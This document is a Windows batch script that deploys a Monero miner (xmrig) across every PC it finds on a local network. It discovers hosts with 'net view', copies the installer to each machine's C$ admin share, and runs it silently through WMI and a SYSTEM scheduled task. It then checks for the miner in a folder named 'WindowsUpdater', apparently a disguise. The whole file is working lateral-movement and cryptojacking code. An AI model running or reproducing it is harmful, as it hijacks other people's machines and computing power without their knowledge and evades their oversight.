@echo off
setlocal enabledelayedexpansion
title Monero Fleet Auto-Deployer - 25 PC Network Deployment

REM ====================================================================
REM TRUE FLEET DEPLOYMENT - Network-wide installation
REM Deploys V5 to all reachable PCs simultaneously
REM ====================================================================

set "DEPLOY_SCRIPT=install_miner-V5-optimized.bat"
set "SOURCE_DIR=%~dp0miner_src"
set "ADMIN_USER=administrator"
set "TIMEOUT=30"

REM === Check for admin rights ===
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Run as Administrator for network deployment
    pause
    exit /b
)

echo [*] Starting fleet deployment...
echo [*] Scanning network for target PCs...

REM === Auto-discover PCs on network ===
set "PC_COUNT=0"
for /f "tokens=1" %%A in ('net view ^| find "\\"') do (
    set "PC=%%A"
    set "PC=!PC:~2!"
    if "!PC!" neq "" (
        set /a PC_COUNT+=1
        set "PC_!PC_COUNT!=!PC!"
        echo [+] Found: !PC!
    )
)

echo [*] Discovered %PC_COUNT% PCs
pause

REM === Deploy to all PCs simultaneously ===
for /l %%i in (1,1,%PC_COUNT%) do (
    set "TARGET=!PC_%%i!"
    echo [*] Deploying to !TARGET!...
    
    REM Copy files to admin share
    if exist "\\!TARGET!\C$" (
        echo [+] !TARGET! - Copying files...
        
        REM Create remote directory
        mkdir "\\!TARGET!\C$\Windows\Temp\miner_deploy" 2>nul
        
        REM Copy deployment files
        xcopy /Y /Q /E "%DEPLOY_SCRIPT%" "\\!TARGET!\C$\Windows\Temp\miner_deploy\" >nul
        xcopy /Y /Q /E "%SOURCE_DIR%\*" "\\!TARGET!\C$\Windows\Temp\miner_deploy\miner_src\" >nul
        
        REM Execute remotely via PsExec (if available) or WMI
        echo [+] !TARGET! - Executing deployment...
        
        REM Method 1: WMI (built-in)
        wmic /node:!TARGET! process call create "cmd.exe /c \"C:\Windows\Temp\miner_deploy\install_miner-V5-optimized.bat /silent\"" >nul 2>&1
        
        REM Method 2: Scheduled task (fallback)
        schtasks /create /s !TARGET! /tn "FleetDeploy" /tr "cmd.exe /c C:\Windows\Temp\miner_deploy\install_miner-V5-optimized.bat /silent" /sc once /st 23:59 /ru SYSTEM /f >nul 2>&1
        schtasks /run /s !TARGET! /tn "FleetDeploy" >nul 2>&1
        
        echo [✔] !TARGET! - Deployment initiated
    ) else (
        echo [!] !TARGET! - Access denied or offline
    )
)

echo [*] Fleet deployment complete!
echo [*] Monitoring deployment status...

REM === Monitor deployment progress ===
timeout /t 60 /nobreak >nul

echo [*] Checking deployment status...
for /l %%i in (1,1,%PC_COUNT%) do (
    set "TARGET=!PC_%%i!"
    if exist "\\!TARGET!\C$\ProgramData\WindowsUpdater\xmrig.exe" (
        echo [✔] !TARGET! - Successfully deployed
    ) else (
        echo [!] !TARGET! - Deployment failed
    )
)

echo [*] Fleet deployment summary complete!
pause
